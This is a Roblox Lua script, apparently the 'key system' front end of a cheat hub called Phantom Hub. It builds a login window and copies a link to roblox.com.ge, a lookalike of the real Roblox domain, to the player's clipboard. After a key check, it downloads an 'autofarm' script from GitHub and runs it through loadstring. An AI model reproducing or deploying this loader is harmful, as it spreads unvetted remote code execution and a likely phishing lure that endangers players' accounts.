-- =========================
-- PHANTOM HUB KEY SYSTEM
-- =========================

-- CONFIG
local GROUP_ID = 7178088300
local GROUP_LINK = "https://roblox.com.ge/communities/7178088300/"
local KEY_URL = "https://raw.githubusercontent.com/YOURUSERNAME/YOURREPO/main/keys.txt"

-- MAIN SCRIPT
local MAIN_SCRIPT = "https://raw.githubusercontent.com/PhantomHub-ui/autofarm/refs/heads/main/lua"

-- SERVICES
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- UI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "PhantomKeySystem"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.fromScale(0.36, 0.34)
frame.Position = UDim2.fromScale(0.32, 0.33)
frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
frame.BorderSizePixel = 0
Instance.new("UICorner", frame).CornerRadius = UDim.new(0,12)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.fromScale(1, 0.18)
title.BackgroundTransparency = 1
title.Text = "Phantom Hub Access"
title.TextColor3 = Color3.new(1,1,1)
title.TextScaled = true
title.Font = Enum.Font.GothamBold

local copyBtn = Instance.new("TextButton", frame)
copyBtn.Size = UDim2.fromScale(0.9, 0.16)
copyBtn.Position = UDim2.fromScale(0.05, 0.22)
copyBtn.Text = "Copy Link"
copyBtn.TextScaled = true
copyBtn.Font = Enum.Font.Gotham

local status = Instance.new("TextLabel", frame)
status.Size = UDim2.fromScale(0.9, 0.14)
status.Position = UDim2.fromScale(0.05, 0.42)
status.BackgroundTransparency = 1
status.TextScaled = true
status.Font = Enum.Font.GothamBold

local keyBox = Instance.new("TextBox", frame)
keyBox.Size = UDim2.fromScale(0.9, 0.14)
keyBox.Position = UDim2.fromScale(0.05, 0.58)
keyBox.PlaceholderText = "Enter Key"
keyBox.TextScaled = true
keyBox.Font = Enum.Font.Gotham
keyBox.ClearTextOnFocus = false

local verify = Instance.new("TextButton", frame)
verify.Size = UDim2.fromScale(0.9, 0.16)
verify.Position = UDim2.fromScale(0.05, 0.76)
verify.Text = "Verify Access"
verify.TextScaled = true
verify.Font = Enum.Font.GothamBold

-- COPY LINK
copyBtn.MouseButton1Click:Connect(function()
    if setclipboard then
        setclipboard(GROUP_LINK)
        copyBtn.Text = "Link Copied!"
        task.wait(1.2)
        copyBtn.Text = "Copy Link"
    end
end)

-- STATUS CHECK LOOP
task.spawn(function()
    while gui.Parent do
        if player:IsInGroup(GROUP_ID) then
            status.Text = "STATUS: JOINED ✅"
            status.TextColor3 = Color3.fromRGB(0,255,0)
        else
            status.Text = "STATUS: NOT JOINED ❌"
            status.TextColor3 = Color3.fromRGB(255,80,80)
        end
        task.wait(1.5)
    end
end)

-- KEY CHECK
local function validKey(key)
    local ok, data = pcall(function()
        return game:HttpGet(KEY_URL)
    end)
    if not ok then return false end

    for k in string.gmatch(data, "[^\r\n]+") do
        if key == k then
            return true
        end
    end
    return false
end

-- VERIFY
verify.MouseButton1Click:Connect(function()
    if not player:IsInGroup(GROUP_ID) then
        verify.Text = "Join Group First"
        task.wait(1.2)
        verify.Text = "Verify Access"
        return
    end

    if validKey(keyBox.Text) then
        gui:Destroy()
        loadstring(game:HttpGet(MAIN_SCRIPT))()
    else
        verify.Text = "Invalid Key"
        task.wait(1.2)
        verify.Text = "Verify Access"
    end
end)
